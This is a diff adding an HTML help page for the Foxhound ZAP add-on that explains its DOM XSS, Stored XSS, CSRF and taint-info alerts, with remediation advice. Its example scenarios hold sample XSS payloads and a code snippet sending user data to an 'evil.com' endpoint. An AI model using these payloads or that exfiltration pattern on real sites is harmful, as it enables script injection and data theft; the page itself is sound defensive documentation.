@@ -1,0 +1,308 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+<TITLE>Alerts</TITLE>
+</HEAD>
+<BODY>
+<H1>Alerts</H1>
+
+<p>Foxhound automatically analyzes taint flows and raises ZAP alerts for detected vulnerabilities. This page describes the alert types and how they're generated.
+
+<H2>How Alerts Are Generated</H2>
+<p>Foxhound uses an event-driven alert system:
+<ol>
+<li>When a taint flow is received, FoxhoundEventPublisher fires a TAINT_INFO_CREATED event
+<li>FoxhoundAlertHelper listens for these events
+<li>The helper runs vulnerability checks against the taint flow
+<li>Each check examines the source+sink combination
+<li>If a check matches, a ZAP alert is raised
+<li>Alerts appear in ZAP's Alerts tab with full details
+</ol>
+
+<p><strong>Alert Severity Levels:</strong>
+<ul>
+<li><strong>High:</strong> Critical vulnerabilities (DOM XSS, Stored XSS)
+<li><strong>Medium:</strong> Important vulnerabilities (CSRF)
+<li><strong>Informational:</strong> General taint flow documentation
+</ul>
+
+<H2>DOM XSS (Plugin ID: 40100)</H2>
+
+<h3>Description</h3>
+<p>Detects DOM-based Cross-Site Scripting vulnerabilities where user-controlled data from URLs or inputs flows into dangerous JavaScript execution or HTML rendering sinks.
+
+<h3>Risk Level</h3>
+<p><strong>High</strong> - Allows attackers to execute arbitrary JavaScript in victim browsers
+
+<h3>Detection Criteria</h3>
+<p>Alert raised when:
+<ul>
+<li><strong>Sources:</strong> Data originates from URL or INPUT tagged sources
+  <ul>
+  <li>location.hash, location.search, location.href
+  <li>document.URL, document.documentURI
+  <li>window.name, document.referrer
+  <li>Form input elements
+  </ul>
+<li><strong>Sinks:</strong> Data reaches XSS tagged sinks
+  <ul>
+  <li>eval(), Function() constructor
+  <li>setTimeout(), setInterval() with string argument
+  <li>innerHTML, outerHTML
+  <li>document.write(), document.writeln()
+  <li>insertAdjacentHTML()
+  <li>location.href = ..., location = ...
+  </ul>
+</ul>
+
+<h3>Example Scenario</h3>
+<pre>
+URL: https://example.com/page#&lt;img src=x onerror=alert(1)&gt;
+
+JavaScript:
+var hash = location.hash.substring(1);  // Source: location.hash
+document.getElementById('output').innerHTML = hash;  // Sink: innerHTML
+
+Result: XSS payload executes, Foxhound raises alert
+</pre>
+
+<h3>Remediation</h3>
+<ul>
+<li>Never insert user-controlled data directly into HTML or JavaScript
+<li>Use <code>textContent</code> instead of <code>innerHTML</code> when possible
+<li>Sanitize and encode data before rendering:
+  <ul>
+  <li>HTML context: Use HTML entity encoding
+  <li>JavaScript context: Use JavaScript string escaping
+  <li>URL context: Use URL encoding
+  </ul>
+<li>Implement Content Security Policy (CSP) to block inline scripts
+<li>Use frameworks with auto-escaping (React, Angular, Vue)
+</ul>
+
+<h3>References</h3>
+<ul>
+<li>OWASP Top 10 2021: <a href="https://owasp.org/Top10/A03_2021-Injection/">A03:2021 - Injection</a>
+<li>OWASP Top 10 2017: <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">A07:2017 - XSS</a>
+<li>WSTG: <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">CLNT-01 - DOM XSS</a>
+</ul>
+
+<H2>Stored XSS (Plugin ID: 40101)</H2>
+
+<h3>Description</h3>
+<p>Detects stored (persistent) Cross-Site Scripting vulnerabilities where data from storage APIs flows into dangerous sinks.
+
+<h3>Risk Level</h3>
+<p><strong>High</strong> - Allows persistent attacks affecting all users who access stored data
+
+<h3>Detection Criteria</h3>
+<p>Alert raised when:
+<ul>
+<li><strong>Sources:</strong> Data originates from STORAGE tagged sources
+  <ul>
+  <li>localStorage.getItem()
+  <li>sessionStorage.getItem()
+  <li>document.cookie
+  </ul>
+<li><strong>Sinks:</strong> Data reaches XSS tagged sinks
+  <ul>
+  <li>Same sinks as DOM XSS (eval, innerHTML, etc.)
+  </ul>
+</ul>
+
+<h3>Example Scenario</h3>
+<pre>
+// Attacker stores malicious data (via separate vulnerability)
+localStorage.setItem('username', '&lt;img src=x onerror=alert(1)&gt;');
+
+// Later, victim's browser reads and renders it
+var username = localStorage.getItem('username');  // Source: localStorage
+document.getElementById('welcome').innerHTML = 'Hello ' + username;  // Sink: innerHTML
+
+Result: XSS payload executes for every user, Foxhound raises alert
+</pre>
+
+<h3>Remediation</h3>
+<ul>
+<li>Never trust data from storage - it may have been poisoned
+<li>Validate and sanitize data before storing
+<li>Validate and encode data when retrieving from storage
+<li>Use <code>textContent</code> for rendering user data
+<li>Implement CSP to mitigate impact
+<li>Consider storing data on server-side instead of client-side
+</ul>
+
+<h3>References</h3>
+<ul>
+<li>OWASP Top 10 2021: <a href="https://owasp.org/Top10/A03_2021-Injection/">A03:2021 - Injection</a>
+<li>OWASP: <a href="https://owasp.org/www-community/attacks/xss/">Cross-Site Scripting (XSS)</a>
+</ul>
+
+<H2>CSRF (Plugin ID: 40102)</H2>
+
+<h3>Description</h3>
+<p>Detects potential Cross-Site Request Forgery vulnerabilities where storage data (potentially attacker-controlled) flows into network requests.
+
+<h3>Risk Level</h3>
+<p><strong>Medium</strong> - Allows attackers to forge requests on behalf of victims
+
+<h3>Detection Criteria</h3>
+<p>Alert raised when:
+<ul>
+<li><strong>Sources:</strong> STORAGE or URL tagged sources
+<li><strong>Sinks:</strong> Network request sinks
+  <ul>
+  <li>XMLHttpRequest.open()
+  <li>fetch()
+  <li>location manipulation (for request forgery)
+  </ul>
+</ul>
+
+<p><strong>Note:</strong> This check is more heuristic and may produce false positives. Manual verification recommended.
+
+<h3>Example Scenario</h3>
+<pre>
+// Attacker manipulates stored data or URL
+localStorage.setItem('apiEndpoint', 'https://evil.com/steal');
+
+// Application uses stored data in request
+var endpoint = localStorage.getItem('apiEndpoint');  // Source: localStorage
+fetch(endpoint, {method: 'POST', body: userData});  // Sink: fetch
+
+Result: Data sent to attacker-controlled endpoint, Foxhound raises alert
+</pre>
+
+<h3>Remediation</h3>
+<ul>
+<li>Implement CSRF tokens for state-changing requests
+<li>Validate and whitelist URL destinations
+<li>Use SameSite cookie attribute
+<li>Verify request origin headers
+<li>Require re-authentication for sensitive operations
+<li>Never construct request URLs from untrusted data
+</ul>
+
+<h3>References</h3>
+<ul>
+<li>OWASP: <a href="https://owasp.org/www-community/attacks/csrf">Cross-Site Request Forgery (CSRF)</a>
+<li>OWASP WSTG: <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">SESS-05 - CSRF</a>
+</ul>
+
+<H2>General Taint Info (Plugin ID: 40103)</H2>
+
+<h3>Description</h3>
+<p>Documents all detected taint flows that don't match specific vulnerability patterns. Provides visibility into application data flows.
+
+<h3>Risk Level</h3>
+<p><strong>Informational</strong> - Not necessarily a vulnerability, but worth reviewing
+
+<h3>Detection Criteria</h3>
+<p>Alert raised for:
+<ul>
+<li>Any taint flow that doesn't trigger DOM XSS, Stored XSS, or CSRF alerts
+<li>Flows with interesting source/sink combinations
+<li>All flows when comprehensive logging is needed
+</ul>
+
+<h3>Purpose</h3>
+<ul>
+<li>Document data flow paths for security review
+<li>Identify unexpected data flows
+<li>Support manual security analysis
+<li>Provide audit trail of taint tracking
+</ul>
+
+<h3>Example Scenarios</h3>
+<ul>
+<li>URL data flowing to console.log (no vulnerability, but interesting)
+<li>localStorage to JSON.parse (potential for injection if not validated)
+<li>Network response to DOM manipulation (may be safe if sanitized)
+</ul>
+
+<h3>Action</h3>
+<ul>
+<li>Review these flows manually
+<li>Determine if they represent security risks
+<li>Consider if additional validation is needed
+<li>Use filters to focus on specific flow types
+</ul>
+
+<H2>Alert Details</H2>
+
+<h3>Alert Fields</h3>
+<p>Foxhound alerts include:
+<ul>
+<li><strong>Name:</strong> Alert type (e.g., "DOM-based XSS (Foxhound)")
+<li><strong>Risk:</strong> High, Medium, or Informational
+<li><strong>Confidence:</strong> Medium (based on taint analysis)
+<li><strong>URL:</strong> Page where vulnerability was detected
+<li><strong>Description:</strong> Explanation of the vulnerability
+<li><strong>Other Info:</strong> Taint flow details:
+  <ul>
+  <li>Tainted string flowing into sink
+  <li>Sink name and parameters
+  <li>Source(s) of tainted data
+  <li>Complete operation chain
+  </ul>
+<li><strong>Solution:</strong> Remediation guidance
+<li><strong>References:</strong> Links to OWASP and security resources
+<li><strong>CWE ID:</strong> Common Weakness Enumeration identifier
+<li><strong>WASC ID:</strong> Web Application Security Consortium identifier
+</ul>
+
+<h3>Viewing Alert Details</h3>
+<ol>
+<li>Click the <strong>Alerts</strong> tab in ZAP
+<li>Expand the site tree to find Foxhound alerts
+<li>Click an alert to view full details in the right panel
+<li>Review the "Other Info" section for taint flow analysis
+<li>Cross-reference with Foxhound panel for detailed flow visualization
+</ol>
+
+<H2>False Positives</H2>
+
+<h3>Common False Positive Scenarios</h3>
+<ul>
+<li>Data is sanitized/encoded but Foxhound doesn't track sanitization functions
+<li>CSP or other security controls prevent exploitation
+<li>Sink is in unreachable code path
+<li>Application uses a secure framework with auto-escaping
+</ul>
+
+<h3>Handling False Positives</h3>
+<ul>
+<li>Manually verify each alert
+<li>Test exploitability in the actual application
+<li>Use filtering to reduce noise from specific sources/sinks
+<li>Report persistent false positives as issues on GitHub
+</ul>
+
+<h3>Reducing False Positives</h3>
+<ul>
+<li>Disable sources/sinks that are known safe in your application
+<li>Focus testing on high-risk areas
+<li>Use manual confirmation for CSRF alerts
+</ul>
+
+<H2>See Also</H2>
+<table>
+<tr>
+    <td>&nbsp;&nbsp;&nbsp;&nbsp;</td>
+    <td><a href="concepts.html">Core Concepts</a></td>
+    <td>for understanding sources, sinks, and flows</td>
+</tr>
+<tr>
+    <td>&nbsp;&nbsp;&nbsp;&nbsp;</td>
+    <td><a href="panel.html">Foxhound Panel</a></td>
+    <td>for viewing detailed taint flow chains</td>
+</tr>
+<tr>
+    <td>&nbsp;&nbsp;&nbsp;&nbsp;</td>
+    <td><a href="options.html">Options</a></td>
+    <td>for configuring sources and sinks</td>
+</tr>
+</table>
+
+</BODY>
+</HTML>
